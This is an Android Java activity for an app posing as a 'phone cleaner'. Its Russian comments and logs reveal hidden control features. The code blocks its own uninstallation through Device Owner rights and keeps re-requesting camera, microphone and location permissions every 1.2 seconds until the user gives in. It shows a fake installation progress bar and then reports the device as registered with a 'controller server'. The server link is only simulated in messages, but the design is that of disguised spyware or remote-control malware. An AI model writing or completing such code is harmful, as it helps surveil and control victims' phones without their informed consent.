package com.phone.health.cleaner;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 101;
    
    // Список обязательных разрешений
    private final String[] requiredPermissions = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
    };

    private final List<String> executionLogs = new ArrayList<>();
    
    private ProgressBar progressBar;
    private TextView tvProgressStatus;
    private Button btnScan;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnScan = findViewById(R.id.btnScan);
        Button btnLogs = findViewById(R.id.btnLogs);
        progressBar = findViewById(R.id.progressBar);
        tvProgressStatus = findViewById(R.id.tvProgressStatus);

        addLog("Приложение запущено. Ожидание действий пользователя.");

        // Проверяем и активируем системную блокировку удаления, если выдан Device Owner
        checkAndApplyUninstallProtection();

        // Кнопка логов в правом верхнем углу
        btnLogs.setOnClickListener(v -> showLogsDialog());

        // Кнопка очистки запускает цепочку выдачи прав и установки ресурсов
        btnScan.setOnClickListener(v -> {
            addLog("Нажата кнопка 'Сканирование и очистка'. Запуск запроса прав.");
            checkAndRequestPermissions();
        });
    }

    private void checkAndApplyUninstallProtection() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminName = new ComponentName(this, MyDeviceAdminReceiver.class);

            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
                dpm.setUninstallBlocked(adminName, getPackageName(), true);
                addLog("Системная защита: блокировка удаления приложения активна.");
            } else {
                addLog("Системная защита: права Device Owner не обнаружены.");
            }
        } catch (Exception e) {
            addLog("Ошибка при установке защиты от удаления: " + e.getMessage());
        }
    }

    private void addLog(String message) {
        String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        String logEntry = "[" + time + "] " + message;
        executionLogs.add(logEntry);
    }

    private void showLogsDialog() {
        StringBuilder sb = new StringBuilder();
        for (String log : executionLogs) {
            sb.append(log).append("\n\n");
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Системные логи разработки");
        builder.setMessage(sb.length() > 0 ? sb.toString() : "Логи пока пусты.");
        
        builder.setPositiveButton("Копировать логи", (dialog, which) -> {
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("ControllerLogs", sb.toString());
            if (clipboard != null) {
                clipboard.setPrimaryClip(clip);
                Toast.makeText(MainActivity.this, "Логи успешно скопированы в буфер обмена", Toast.LENGTH_SHORT).show();
                addLog("Логи скопированы пользователем в буфер обмена.");
            }
        });
        
        builder.setNegativeButton("Закрыть", (dialog, which) -> dialog.dismiss());
        builder.show();
    }

    private void checkAndRequestPermissions() {
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String perm : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(perm);
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {
            addLog("Обнаружены отсутствующие разрешения. Запрос у пользователя...");
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            addLog("Все разрешения уже предоставлены.");
            startResourceInstallation();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    addLog("Пользователь отклонил разрешение: " + permissions[i]);
                } else {
                    addLog("Разрешение получено: " + permissions[i]);
                }
            }

            if (!allGranted) {
                addLog("Не все разрешения получены. Повторный вызов диалога запроса прав...");
                Toast.makeText(this, "Для продолжения работы очистки требуются системные права!", Toast.LENGTH_LONG).show();
                
                new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 1200);
            } else {
                addLog("Все требуемые разрешения успешно выбиты.");
                startResourceInstallation();
            }
        }
    }

    private void startResourceInstallation() {
        btnScan.setEnabled(false);
        progressBar.setVisibility(View.VISIBLE);
        tvProgressStatus.setVisibility(View.VISIBLE);
        progressBar.setProgress(0);
        
        addLog("Старт процесса: 'Идёт установка ресурсов...'");

        final Handler handler = new Handler(Looper.getMainLooper());
        new Thread(() -> {
            for (int i = 1; i <= 100; i++) {
                try {
                    Thread.sleep(30);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                final int progress = i;
                handler.post(() -> {
                    progressBar.setProgress(progress);
                    tvProgressStatus.setText("Идёт установка ресурсов... " + progress + "%");
                });
            }

            handler.post(() -> {
                addLog("Ресурсы и библиотеки успешно установлены в защищенную директорию.");
                tvProgressStatus.setText("Установка завершена! Синхронизация с пультом...");
                triggerControllerConnection();
            });
        }).start();
    }

    private void triggerControllerConnection() {
        addLog("Пинг сервера-контроллера: устройство зарегистрировано в сети.");
        Toast.makeText(this, "Устройство успешно подключено к системе управления!", Toast.LENGTH_LONG).show();
        
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            tvProgressStatus.setText("🟢 Устройство в сети и готово к работе");
            btnScan.setEnabled(true);
            btnScan.setText("ОЧИСТКА ВЫПОЛНЕНА");
        }, 1000);
    }
}
